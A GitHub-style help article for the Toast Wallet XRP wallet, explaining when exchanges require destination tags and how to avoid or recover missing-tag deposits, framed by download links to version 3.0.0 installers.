<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet destination tag guide</h1>

<p align="center">When a tag is required and what happens if it is missing.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

A destination tag is a number that tells a shared XRP address, usually an exchange, which customer a payment belongs to. When sending from the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) to an exchange, always enter the tag it gives you. When receiving into your own Toast account, you do not need one.

## 👀 You'll see this if

- An exchange's deposit page shows an address and a "tag" or "memo".
- Toast Wallet's send screen has a destination tag field and you are unsure whether to fill it.
- You sent XRP to an exchange and it never arrived.
- A withdrawal form asks for a tag for your Toast address.

## 🤔 Why it matters

Exchanges often use one XRP address for many customers. The destination tag is how they know whose deposit has arrived. Without it, the XRP reaches the exchange's address, but their system cannot match it to your account. Recovering such a payment depends on the exchange's support process and can take a long time.

Personal wallets like Toast Wallet give each account its own address, so no tag is needed to identify you. Entering a random tag when withdrawing to Toast is harmless, but unnecessary.

## 🧭 Before you start

On the exchange, open the XRP deposit page and look for both the address and the tag. Some exchanges call it "memo" or "tag". Keep that page open while you work in Toast Wallet so you can copy both values directly.

## 🛠️ Fix: use tags correctly

1. **Sending to an exchange:** copy the deposit address and the destination tag from the exchange's deposit page.
2. **Open Toast Wallet and choose Send.** Paste the address.
3. **Paste the tag** into the destination tag field. Check every digit.
4. **Send a small test** and wait for the exchange to credit it.
5. **Send the rest** with the same address and tag.
6. **Receiving into Toast:** give the sender your `r` address and leave the tag empty unless they insist; any number they require is for their own bookkeeping.

For the full sending routine, see [send XRP with Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/send-xrp-with-toast-wallet.md).

## 🧩 Real-world example

A user sends XRP from Toast Wallet to an exchange and forgets the tag. The payment confirms on the ledger, but the exchange balance stays at zero. They open a ticket on the exchange's official website, providing the transaction details and their account information, and wait while the exchange matches it manually. Next time, they copy the tag first and send a test, and the deposit appears immediately.

## ⚠️ Common mistakes

- Leaving the tag empty when sending to an exchange.
- Copying the tag from an old deposit page; some exchanges change them.
- Putting the tag into the amount field or the address field.
- Trusting a "support agent" who contacts you about a missing tag.

## 🔁 If that did not work

- **You forgot the tag.** Contact the exchange through its official website with the transaction ID. Never share your keys or passphrase.
- **The exchange says the tag is wrong.** Compare it with the deposit page again.
- **The payment does not appear at all.** Follow [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md).

## 🛡️ Prevention

Make "address, tag, test" your routine for every exchange deposit. Re-copy the tag from the exchange each time. For Coinbase specifically, see [transfer XRP from Toast Wallet to Coinbase](https://github.com/Toast-Wallet/learn/blob/main/how-to/transfer-xrp-from-toast-wallet-to-coinbase.md).

## 🔍 A closer look at how exchanges use tags

Picture a large apartment building with a single street address. Letters arrive at the building, and the apartment number tells the staff which resident each letter belongs to. An exchange's XRP address is the building; the destination tag is the apartment number. Without the number, the letter still reaches the building, but it ends up in a pile of unsorted mail until someone works out who it is for.

This is why the payment itself succeeds on the ledger even when the tag is missing. Toast Wallet did its job and the XRP Ledger recorded the payment. The problem is entirely on the exchange's side, in its internal bookkeeping. Only the exchange can sort it out, usually through a support request with proof of the transaction.

## 🗂️ Tag habits that prevent problems

- Copy the tag from the exchange's deposit page each time, even if you think you remember it.
- Paste the tag into Toast Wallet before entering the amount, so you do not forget it.
- Send a small test first and wait for the exchange to credit it.
- Keep a note of the transaction ID for each exchange deposit, in case you ever need it.
- If you also send XRP to friends, remember they usually do not need a tag; the full sending routine in [send XRP with Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/send-xrp-with-toast-wallet.md) covers both cases.

Following these habits, a missing-tag problem becomes very unlikely.

## 🧠 Remember

Exchange deposit: address plus tag, every time. Personal wallet: address only. If you keep those two lines in mind, destination tags stop being confusing. When in doubt, look at the receiving side's own instructions; if they show a tag, it is required.

## ❓ FAQ

<details>
<summary>Do I need a tag between two Toast accounts?</summary>

No. Each Toast account has its own address.

</details>

<details>
<summary>Is the tag secret?</summary>

No, but it identifies your exchange account, so share it only with the exchange flow itself.

</details>

<details>
<summary>Can Toast Wallet recover a missing-tag payment?</summary>

No. The XRP arrived at the exchange; only the exchange can credit it.

</details>

> [!WARNING]
> People who message you offering to recover missing-tag deposits are scammers. Contact your exchange only through its official site.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Send XRP with Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/send-xrp-with-toast-wallet.md) | Address, tag, amount and passphrase: a careful sending routine. |
| [Transfer XRP from Toast Wallet to Coinbase](https://github.com/Toast-Wallet/learn/blob/main/how-to/transfer-xrp-from-toast-wallet-to-coinbase.md) | Send XRP to an exchange deposit address with the right tag. |
| [Receive XRP in Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/receive-xrp-in-toast-wallet.md) | Share the right address and confirm the payment arrived. |
